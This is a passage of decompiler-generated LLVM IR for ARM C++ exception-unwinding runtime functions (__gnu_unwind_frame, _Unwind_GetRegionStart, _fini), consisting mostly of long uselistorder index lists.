372, 46, 373, 47, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 514, 515, 43, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 7, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 663, 664, 665, 666, 667, 668, 669, 670, 671, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 760, 761, 762, 763, 764, 765, 766, 767, 768, 776, 777, 778, 779, 780 }
  uselistorder i32* @r7, { 377, 378, 379, 381, 382, 380, 383, 384, 385, 386, 0, 387, 388, 389, 401, 390, 391, 392, 393, 394, 395, 6, 396, 397, 398, 399, 400, 4, 1, 402, 70, 71, 72, 73, 109, 110, 111, 112, 113, 114, 403, 74, 7, 75, 76, 77, 8, 78, 79, 80, 81, 9, 82, 83, 10, 84, 85, 86, 11, 87, 88, 89, 90, 91, 12, 92, 93, 94, 95, 96, 13, 97, 98, 99, 100, 54, 55, 14, 56, 57, 58, 59, 60, 61, 15, 62, 63, 64, 65, 66, 67, 68, 69, 101, 105, 102, 103, 104, 106, 107, 108, 115, 116, 365, 366, 327, 328, 224, 225, 404, 405, 406, 407, 417, 418, 236, 237, 238, 239, 117, 118, 119, 120, 408, 409, 410, 411, 273, 274, 275, 276, 277, 367, 368, 369, 370, 162, 163, 16, 52, 53, 329, 330, 335, 336, 337, 338, 339, 340, 341, 331, 332, 333, 334, 310, 311, 312, 313, 314, 315, 342, 343, 344, 345, 346, 347, 348, 349, 17, 350, 351, 352, 290, 291, 278, 279, 280, 281, 292, 295, 296, 297, 293, 294, 226, 227, 228, 229, 121, 124, 125, 126, 122, 123, 164, 165, 31, 127, 128, 298, 301, 302, 303, 299, 300, 304, 305, 175, 176, 177, 178, 179, 184, 185, 186, 187, 180, 181, 182, 183, 188, 189, 190, 191, 192, 193, 166, 167, 129, 130, 131, 132, 133, 134, 194, 195, 371, 372, 135, 18, 136, 137, 412, 19, 413, 414, 415, 416, 196, 197, 198, 199, 200, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 48, 49, 36, 33, 20, 32, 34, 2, 35, 37, 38, 47, 39, 40, 41, 42, 43, 44, 45, 46, 50, 51, 3, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 168, 21, 169, 170, 171, 172, 173, 174, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 29, 219, 220, 221, 222, 223, 230, 30, 231, 232, 233, 234, 235, 240, 241, 242, 243, 244, 245, 246, 247, 22, 248, 249, 250, 251, 252, 253, 254, 255, 256, 5, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 282, 23, 283, 284, 285, 25, 24, 286, 287, 288, 289, 27, 26, 306, 307, 308, 309, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 355, 353, 354, 28, 356, 357, 358, 359, 360, 361, 362, 363, 364, 373, 374, 375, 376 }
  uselistorder i32* @lr, { 3, 0, 169, 170, 171, 172, 180, 173, 174, 175, 176, 1, 177, 178, 179, 181, 182, 183, 184, 185, 186, 188, 189, 6, 7, 190, 191, 192, 193, 194, 195, 196, 197, 198, 10, 11, 12, 13, 14, 15, 16, 17, 18, 8, 9, 19, 199, 200, 202, 203, 204, 209, 84, 85, 22, 23, 207, 208, 124, 125, 166, 167, 168, 201, 205, 206, 4, 20, 21, 141, 142, 143, 144, 145, 134, 135, 136, 146, 159, 160, 147, 148, 149, 150, 151, 152, 153, 2, 154, 155, 157, 158, 156, 126, 127, 132, 133, 77, 78, 24, 25, 161, 162, 53, 54, 55, 56, 57, 58, 26, 27, 187, 59, 163, 86, 5, 28, 29, 30, 31, 35, 36, 37, 38, 32, 33, 34, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 79, 80, 81, 82, 83, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 128, 129, 130, 131, 137, 138, 139, 140, 164, 165 }
  uselistorder i32* @r6, { 465, 466, 467, 478, 468, 28, 469, 5, 470, 471, 6, 472, 473, 474, 475, 476, 477, 479, 0, 480, 481, 95, 96, 93, 94, 97, 482, 483, 7, 484, 485, 486, 487, 80, 81, 98, 8, 99, 100, 101, 102, 103, 24, 104, 105, 106, 9, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 78, 79, 82, 83, 84, 85, 10, 86, 87, 88, 11, 89, 90, 91, 92, 119, 29, 120, 25, 12, 13, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 455, 456, 457, 490, 458, 14, 459, 460, 75, 15, 76, 16, 77, 488, 489, 408, 412, 413, 414, 415, 409, 410, 411, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 416, 441, 442, 443, 417, 418, 419, 420, 421, 17, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 437, 439, 433, 434, 435, 436, 438, 440, 132, 133, 2, 134, 335, 336, 361, 362, 363, 364, 365, 268, 269, 135, 136, 137, 138, 139, 366, 367, 368, 369, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 140, 141, 142, 143, 144, 145, 146, 147, 226, 18, 227, 228, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 35, 41, 162, 163, 164, 165, 62, 63, 64, 65, 66, 166, 167, 168, 169, 46, 67, 36, 37, 38, 47, 32, 33, 34, 39, 40, 42, 43, 44, 45, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 68, 69, 70, 71, 72, 73, 74, 170, 171, 172, 4, 3, 173, 174, 175, 176, 177, 178, 179, 26, 180, 181, 182, 183, 184, 1, 191, 192, 193, 194, 195, 185, 186, 187, 188, 189, 190, 275, 276, 277, 278, 196, 197, 198, 199, 200, 201, 202, 203, 19, 204, 205, 206, 207, 208, 209, 210, 211, 229, 230, 231, 232, 27, 233, 234, 235, 20, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 270, 271, 272, 273, 274, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 30, 21, 350, 351, 353, 354, 352, 355, 356, 357, 358, 359, 360, 370, 371, 31, 22, 372, 373, 375, 376, 374, 377, 378, 379, 380, 381, 382, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 23, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 461, 462, 463, 464 }
  uselistorder label %dec_label_pc_1a6e8, { 1, 0 }
  uselistorder label %dec_label_pc_1a684, { 1, 0 }
  uselistorder label %dec_label_pc_1a630, { 1, 0 }
  uselistorder label %dec_label_pc_1a608, { 1, 0 }
  uselistorder label %dec_label_pc_1a574, { 1, 0 }
  uselistorder label %dec_label_pc_1a558, { 1, 0 }
  uselistorder label %dec_label_pc_1a53c, { 1, 0 }
  uselistorder label %dec_label_pc_1a4ec, { 1, 0 }
  uselistorder label %dec_label_pc_1a4d0, { 1, 0 }
  uselistorder label %dec_label_pc_1a44c, { 1, 0 }
  uselistorder label %dec_label_pc_1a430, { 1, 0 }
  uselistorder label %dec_label_pc_1a36c, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_1a33c, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_1a324, { 1, 0 }
  uselistorder label %dec_label_pc_1a308, { 1, 0 }
  uselistorder label %dec_label_pc_1a06c.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1a194, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1a188, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a17c, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_1a12c, { 1, 0 }
  uselistorder label %dec_label_pc_1a11c, { 1, 0 }
  uselistorder label %dec_label_pc_1a0a8, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_1a770 = add i32 %ucbp, 76
  %v2_1a770 = inttoptr i32 %v1_1a770 to i32*
  %v3_1a770 = load i32, i32* %v2_1a770, align 4
  %v1_1a774 = add i32 %v3_1a770, 4
  %v2_1a774 = inttoptr i32 %v1_1a774 to i32*
  %v3_1a774 = load i32, i32* %v2_1a774, align 4
  %v3_1a77c = mul i32 %v3_1a774, 256
  %v4_1a784 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_1a77c, i32* %v4_1a784, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_1a7a4 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_1a7a4

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 310, 299, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 289, 300, 297, 50, 298, 51, 53, 52, 54, 288, 290, 293, 55, 56, 57, 0, 296, 1, 58, 59, 60, 61, 62, 64, 65, 66, 63, 68, 69, 70, 67, 71, 294, 72, 301, 302, 73, 74, 75, 304, 76, 77, 78, 79, 80, 81, 82, 83, 84, 87, 86, 85, 88, 295, 305, 303, 89, 90, 91, 92, 93, 94, 96, 95, 97, 99, 98, 100, 101, 2, 110, 106, 111, 107, 102, 103, 104, 112, 108, 113, 109, 105, 114, 115, 116, 117, 118, 128, 129, 123, 130, 124, 119, 120, 125, 131, 126, 132, 127, 121, 122, 133, 134, 135, 136, 141, 139, 137, 142, 140, 138, 143, 144, 146, 148, 149, 147, 145, 150, 291, 306, 151, 153, 152, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 168, 166, 164, 169, 167, 165, 170, 171, 173, 175, 176, 174, 172, 177, 292, 307, 178, 180, 179, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 308, 191, 309, 200, 195, 201, 196, 197, 192, 193, 202, 198, 194, 199, 203, 204, 205, 206, 207, 208, 209, 216, 213, 217, 214, 218, 215, 210, 211, 212, 219, 220, 221, 222, 227, 234, 228, 235, 229, 223, 224, 236, 230, 225, 231, 237, 232, 226, 233, 238, 239, 240, 241, 242, 243, 248, 255, 249, 256, 250, 244, 245, 257, 251, 246, 252, 258, 253, 247, 254, 259, 260, 261, 262, 263, 264, 274, 270, 265, 275, 271, 276, 272, 266, 267, 268, 277, 273, 269, 278, 279, 280, 281, 282, 283, 3, 284, 285, 4, 286, 287 }
  uselistorder i32 4, { 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 103, 500, 501, 502, 503, 504, 4, 507, 508, 505, 506, 509, 5, 510, 511, 512, 513, 6, 530, 7, 514, 515, 516, 517, 518, 8, 519, 9, 520, 521, 522, 523, 524, 525, 526, 10, 527, 140, 528, 529, 531, 532, 533, 534, 11, 535, 12, 254, 255, 256, 257, 273, 274, 536, 235, 236, 432, 241, 258, 13, 14, 539, 15, 16, 86, 81, 82, 17, 540, 83, 541, 68, 18, 19, 84, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 20, 559, 560, 561, 562, 563, 564, 67, 565, 566, 567, 568, 569, 570, 21, 22, 85, 571, 266, 104, 264, 265, 259, 260, 261, 262, 263, 237, 238, 239, 240, 242, 243, 244, 245, 246, 247, 23, 248, 105, 249, 250, 251, 252, 253, 141, 267, 268, 269, 270, 271, 272, 24, 275, 276, 277, 278, 312, 313, 279, 280, 281, 572, 25, 142, 106, 143, 574, 26, 575, 144, 233, 234, 573, 78, 483, 484, 485, 486, 145, 69, 436, 437, 438, 439, 440, 441, 146, 147, 27, 442, 443, 444, 445, 446, 447, 448, 449, 148, 434, 435, 407, 408, 409, 410, 411, 412, 413, 414, 415, 28, 416, 417, 418, 450, 29, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 149, 150, 151, 465, 466, 469, 472, 467, 468, 107, 152, 470, 60, 471, 473, 474, 475, 477, 153, 31, 30, 476, 154, 155, 156, 282, 32, 33, 157, 61, 34, 35, 314, 315, 316, 317, 318, 36, 319, 70, 537, 538, 203, 37, 38, 108, 283, 71, 227, 115, 228, 284, 285, 229, 230, 39, 286, 87, 109, 110, 213, 214, 111, 207, 208, 209, 205, 206, 210, 211, 212, 215, 216, 217, 112, 218, 219, 220, 113, 221, 114, 222, 223, 224, 225, 226, 231, 232, 63, 62, 287, 79, 288, 40, 289, 41, 65, 64, 291, 42, 290, 292, 293, 298, 204, 299, 116, 300, 117, 302, 118, 303, 304, 301, 294, 119, 295, 296, 297, 404, 305, 76, 75, 74, 306, 120, 43, 44, 45, 46, 47, 307, 73, 72, 308, 77, 121, 309, 310, 311, 122, 320, 321, 158, 322, 323, 324, 159, 160, 0, 123, 325, 88, 326, 327, 328, 161, 329, 330, 162, 163, 1, 124, 331, 89, 332, 90, 333, 334, 335, 336, 164, 337, 338, 165, 166, 339, 340, 125, 341, 2, 342, 91, 343, 126, 344, 345, 346, 347, 167, 348, 349, 168, 169, 350, 351, 127, 352, 3, 353, 92, 354, 128, 355, 48, 356, 357, 358, 170, 359, 360, 361, 362, 171, 172, 129, 363, 130, 364, 93, 365, 366, 367, 173, 368, 369, 174, 175, 370, 94, 371, 95, 372, 373, 374, 375, 176, 376, 377, 177, 178, 132, 378, 131, 379, 96, 380, 97, 381, 382, 383, 384, 385, 386, 134, 387, 135, 388, 179, 389, 66, 390, 180, 181, 136, 391, 133, 392, 98, 393, 99, 394, 395, 396, 182, 397, 398, 183, 184, 399, 137, 400, 100, 401, 185, 186, 187, 402, 403, 138, 101, 188, 189, 190, 405, 406, 139, 102, 191, 49, 419, 192, 50, 420, 193, 51, 421, 194, 52, 422, 195, 53, 423, 196, 80, 54, 424, 425, 197, 55, 426, 198, 56, 427, 199, 57, 428, 200, 58, 429, 201, 59, 430, 431, 433, 478, 479, 480, 481, 482, 487, 202, 488, 489 }
  uselistorder i32 76, { 19, 20, 21, 22, 23, 24, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1, 18 }
  uselistorder i32 1, { 779, 1386, 1387, 616, 1391, 1392, 1393, 1394, 657, 1395, 1396, 563, 579, 658, 1388, 1389, 1390, 1397, 617, 1398, 780, 223, 226, 228, 224, 227, 229, 225, 781, 782, 783, 784, 659, 660, 1399, 1400, 548, 787, 786, 785, 165, 166, 170, 167, 169, 168, 790, 789, 788, 144, 661, 662, 230, 1401, 155, 1402, 793, 792, 791, 231, 1403, 1404, 1405, 1406, 795, 794, 195, 197, 198, 196, 199, 338, 339, 553, 796, 426, 1057, 797, 427, 428, 429, 798, 425, 1058, 1059, 1060, 141, 140, 142, 143, 799, 193, 800, 81, 78, 79, 77, 80, 801, 622, 1030, 175, 176, 174, 164, 163, 1407, 580, 663, 1408, 1, 0, 802, 153, 148, 146, 147, 154, 151, 152, 149, 150, 145, 107, 664, 181, 803, 431, 432, 430, 564, 615, 565, 1330, 1331, 1332, 1333, 581, 804, 433, 806, 805, 434, 435, 1036, 807, 1061, 1062, 1063, 1410, 1065, 1064, 549, 808, 569, 1066, 570, 1411, 1032, 1031, 1412, 571, 1413, 1414, 1415, 1416, 1417, 1418, 991, 1419, 1420, 1421, 1422, 1423, 1424, 992, 773, 810, 809, 520, 524, 526, 522, 521, 523, 525, 527, 529, 528, 1070, 1067, 1068, 1069, 612, 572, 136, 137, 138, 139, 665, 1071, 1072, 1087, 1088, 811, 774, 134, 135, 1079, 993, 1080, 1081, 994, 1082, 1083, 1084, 1085, 1086, 361, 355, 356, 358, 363, 359, 357, 360, 354, 362, 1073, 1074, 1075, 666, 1076, 1077, 1078, 812, 532, 537, 533, 530, 535, 531, 536, 534, 538, 1089, 1090, 1091, 813, 351, 350, 347, 346, 345, 352, 348, 349, 353, 1092, 1093, 1094, 1095, 814, 398, 399, 397, 401, 400, 402, 815, 157, 1034, 667, 1033, 613, 818, 817, 816, 437, 440, 436, 438, 445, 439, 444, 443, 441, 442, 668, 1035, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 573, 819, 447, 446, 448, 451, 449, 450, 452, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 820, 85, 90, 88, 86, 89, 87, 91, 669, 1047, 821, 238, 1096, 1097, 1098, 1099, 1100, 670, 822, 72, 73, 75, 74, 76, 671, 71, 823, 60, 59, 56, 57, 58, 54, 55, 824, 61, 62, 69, 70, 65, 66, 67, 68, 63, 64, 825, 173, 171, 172, 826, 453, 827, 240, 239, 828, 219, 218, 829, 184, 183, 830, 1206, 255, 258, 256, 257, 454, 334, 335, 831, 337, 336, 832, 178, 833, 834, 233, 234, 1425, 1426, 1427, 672, 1428, 1429, 673, 1430, 837, 836, 835, 200, 202, 208, 201, 206, 205, 209, 207, 203, 204, 838, 156, 674, 839, 455, 456, 457, 210, 840, 463, 461, 462, 460, 458, 459, 841, 296, 297, 295, 298, 294, 842, 843, 220, 845, 844, 292, 846, 293, 1379, 849, 848, 847, 270, 271, 850, 273, 275, 274, 276, 574, 851, 300, 546, 550, 1380, 852, 121, 118, 119, 120, 122, 117, 1381, 1382, 1383, 854, 853, 465, 464, 468, 472, 471, 469, 467, 473, 466, 474, 470, 307, 554, 1027, 1028, 1029, 855, 856, 566, 1185, 567, 1186, 1187, 555, 1188, 476, 480, 475, 478, 479, 482, 483, 481, 477, 1189, 1431, 582, 675, 858, 857, 859, 1335, 1338, 1339, 1340, 860, 484, 489, 490, 488, 487, 491, 485, 486, 1341, 1342, 1343, 1344, 861, 495, 501, 494, 500, 499, 493, 503, 502, 497, 492, 496, 498, 1336, 1337, 676, 331, 333, 332, 182, 1319, 677, 1320, 1321, 1322, 1323, 1324, 862, 93, 94, 92, 95, 1345, 385, 384, 1346, 1347, 1348, 1349, 1350, 1351, 623, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 679, 1360, 1361, 1362, 1363, 1364, 678, 1365, 1366, 1367, 1368, 1369, 863, 506, 508, 504, 507, 512, 514, 511, 513, 515, 509, 510, 505, 269, 268, 680, 681, 559, 867, 866, 865, 864, 364, 96, 575, 177, 868, 388, 387, 869, 404, 403, 870, 389, 871, 516, 872, 873, 517, 874, 194, 875, 518, 876, 877, 519, 878, 411, 410, 879, 415, 414, 880, 409, 408, 881, 882, 542, 883, 180, 179, 884, 1271, 1272, 115, 116, 997, 998, 999, 1000, 1001, 1002, 1003, 1432, 110, 111, 112, 113, 885, 1207, 682, 123, 124, 1101, 886, 330, 329, 683, 1208, 887, 221, 222, 684, 888, 237, 235, 236, 1209, 889, 84, 83, 82, 890, 366, 365, 891, 892, 413, 412, 893, 407, 894, 539, 895, 423, 896, 344, 343, 897, 299, 899, 898, 320, 321, 901, 900, 420, 421, 422, 547, 1409, 406, 405, 1210, 1211, 1212, 1213, 552, 1214, 903, 902, 133, 131, 127, 130, 128, 129, 125, 126, 132, 2, 1190, 1191, 1192, 1193, 1273, 576, 1274, 577, 1275, 905, 904, 540, 1215, 1216, 1217, 1218, 906, 1326, 1327, 583, 3, 551, 4, 1328, 1102, 1103, 1104, 685, 1219, 541, 1370, 424, 1221, 1220, 1222, 114, 1276, 1291, 907, 311, 310, 309, 308, 1277, 908, 419, 418, 417, 416, 697, 1022, 698, 1023, 624, 1024, 699, 1025, 585, 700, 701, 1105, 687, 1106, 1009, 1006, 1004, 1005, 692, 689, 560, 1007, 1008, 690, 1010, 1011, 1012, 691, 688, 1013, 1014, 1015, 693, 1016, 1017, 694, 1018, 1019, 695, 1020, 1021, 696, 1026, 1107, 1108, 1109, 702, 1110, 1111, 1112, 703, 584, 1113, 995, 1116, 1115, 686, 1114, 586, 1117, 1118, 1119, 704, 1120, 568, 35, 1121, 34, 1122, 33, 1123, 32, 1124, 31, 1125, 30, 1126, 29, 1127, 28, 1128, 27, 1129, 26, 1130, 25, 1131, 587, 1132, 36, 1133, 24, 1134, 23, 1135, 588, 1136, 37, 1137, 22, 1138, 21, 1139, 20, 1140, 19, 1141, 18, 1142, 17, 1143, 38, 1144, 39, 1145, 40, 1146, 16, 1147, 589, 1148, 15, 1149, 590, 1150, 14, 1151, 13, 1152, 591, 1153, 12, 1154, 41, 1155, 11, 1156, 10, 1157, 592, 1158, 593, 1159, 9, 1160, 8, 1161, 7, 1162, 6, 1163, 594, 1164, 5, 1165, 42, 1166, 595, 1167, 596, 1168, 561, 597, 1169, 562, 598, 599, 600, 996, 601, 1170, 602, 603, 604, 1177, 1178, 556, 705, 775, 921, 920, 919, 918, 917, 916, 915, 914, 913, 912, 911, 910, 909, 368, 371, 369, 370, 367, 372, 373, 374, 1171, 1172, 706, 1173, 1174, 707, 1175, 1176, 379, 378, 377, 383, 380, 381, 382, 376, 375, 708, 709, 923, 922, 544, 545, 1315, 610, 578, 924, 105, 104, 103, 102, 106, 100, 98, 97, 99, 101, 1278, 926, 925, 326, 327, 325, 324, 323, 322, 328, 626, 1179, 712, 1180, 625, 1181, 1182, 710, 711, 713, 1183, 1184, 714, 715, 716, 717, 718, 719, 720, 938, 937, 936, 935, 934, 933, 932, 931, 930, 778, 929, 928, 927, 340, 342, 341, 721, 557, 722, 939, 723, 724, 725, 726, 1194, 611, 1195, 1196, 727, 614, 728, 1197, 729, 1198, 730, 1199, 731, 1200, 732, 1201, 733, 1202, 734, 1203, 735, 1204, 736, 1205, 558, 737, 951, 950, 949, 948, 947, 946, 945, 944, 943, 942, 941, 940, 158, 159, 162, 160, 161, 1223, 1229, 44, 605, 1224, 738, 1225, 43, 1226, 618, 1227, 606, 607, 1228, 1230, 1231, 619, 1232, 776, 955, 954, 777, 953, 952, 386, 1305, 627, 628, 1306, 45, 46, 47, 1233, 1234, 1235, 739, 1236, 740, 741, 1237, 629, 1238, 956, 278, 282, 283, 284, 281, 277, 280, 279, 1239, 1240, 1241, 742, 1242, 743, 631, 630, 744, 1243, 745, 1244, 957, 190, 191, 192, 189, 185, 188, 186, 187, 1245, 1246, 1247, 1248, 1249, 746, 1250, 747, 1251, 748, 636, 635, 749, 1252, 632, 1253, 633, 1254, 634, 1255, 963, 962, 961, 960, 959, 958, 391, 392, 394, 393, 390, 396, 395, 1256, 1257, 1258, 1259, 1260, 750, 1261, 751, 1262, 752, 645, 644, 753, 1263, 643, 1264, 642, 1265, 637, 1266, 638, 1267, 639, 1268, 640, 1269, 641, 1270, 969, 968, 967, 966, 965, 964, 244, 245, 247, 246, 241, 243, 242, 1279, 1280, 1281, 1282, 1283, 620, 621, 754, 1284, 1285, 755, 1286, 1287, 756, 1288, 1290, 1289, 973, 972, 971, 970, 249, 251, 253, 254, 248, 250, 252, 1292, 1293, 1294, 757, 758, 975, 974, 302, 305, 306, 301, 304, 303, 1295, 1296, 1297, 759, 648, 647, 760, 1298, 646, 1299, 976, 312, 313, 317, 318, 319, 316, 315, 314, 1300, 1301, 1302, 761, 651, 650, 762, 1303, 649, 1304, 981, 980, 979, 978, 977, 260, 261, 266, 265, 267, 264, 262, 259, 263, 1307, 1308, 1309, 763, 1310, 764, 653, 652, 765, 1311, 982, 289, 290, 291, 288, 285, 287, 286, 1312, 1313, 766, 1314, 654, 608, 767, 983, 216, 217, 1316, 1317, 768, 1318, 655, 609, 769, 984, 211, 212, 1325, 656, 770, 985, 213, 214, 215, 1329, 986, 272, 1334, 987, 232, 1371, 1374, 771, 1375, 1376, 1372, 1373, 1377, 1378, 49, 50, 52, 51, 48, 53, 1384, 772, 988, 108, 1385, 109, 989, 990, 543 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1a7d0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1a7d8 = add i32 %tmp1, 72
  %v2_1a7d8 = inttoptr i32 %v1_1a7d8 to i32*
  %v3_1a7d8 = load i32, i32* %v2_1a7d8, align 4
  ret i32 %v3_1a7d8

; uselistorder directives
  uselistorder i32 72, { 12, 13, 0, 14, 2, 3, 1, 4, 9, 10, 6, 7, 11, 8, 5 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 170, 171, 172, 173, 14, 15, 61, 16, 174, 53, 11, 175, 176, 177, 178, 179, 181, 182, 180, 183, 184, 185, 186, 187, 188, 189, 17, 18, 19, 20, 22, 21, 23, 54, 55, 24, 25, 56, 57, 58, 59, 60, 62, 63, 86, 64, 65, 190, 5, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 3, 124, 125, 126, 127, 128, 26, 129, 147, 27, 28, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 166, 159, 160, 161, 162, 163, 164, 165, 167, 168, 29, 169, 4, 87, 88, 30, 89, 90, 91, 31, 66, 39, 42, 49, 50, 67, 51, 68, 40, 41, 38, 43, 44, 45, 46, 47, 48, 52, 69, 70, 71, 6, 72, 73, 74, 75, 77, 78, 80, 79, 32, 81, 33, 82, 34, 83, 85, 84, 76, 121, 92, 93, 35, 94, 95, 96, 36, 97, 98, 99, 100, 101, 102, 12, 103, 104, 105, 106, 107, 108, 13, 109, 110, 37, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 122, 123, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1a7ec = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1a7ec)
  %v31_1a7f4 = load i32, i32* @r0, align 4
  ret i32 %v31_1a7f4

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 237, 238, 239, 16, 19, 79, 90, 240, 243, 244, 70, 17, 241, 242, 219, 46, 8, 245, 9, 18, 80, 0, 81, 10, 11, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 1, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 82, 42, 71, 72, 73, 74, 75, 76, 77, 78, 83, 84, 85, 86, 87, 88, 89, 20, 235, 21, 236, 22, 23, 24, 25, 161, 162, 272, 273, 275, 58, 59, 60, 61, 26, 193, 194, 2, 27, 28, 92, 93, 3, 29, 30, 276, 277, 4, 31, 32, 202, 203, 5, 33, 34, 67, 68, 274, 146, 91, 221, 35, 55, 56, 222, 6, 223, 224, 225, 213, 53, 214, 215, 216, 54, 217, 218, 36, 233, 226, 227, 228, 229, 230, 231, 232, 94, 95, 37, 204, 38, 205, 209, 39, 210, 189, 40, 190, 96, 41, 97, 211, 49, 212, 98, 43, 44, 163, 164, 165, 166, 99, 45, 100, 47, 48, 167, 168, 169, 170, 101, 102, 103, 104, 105, 106, 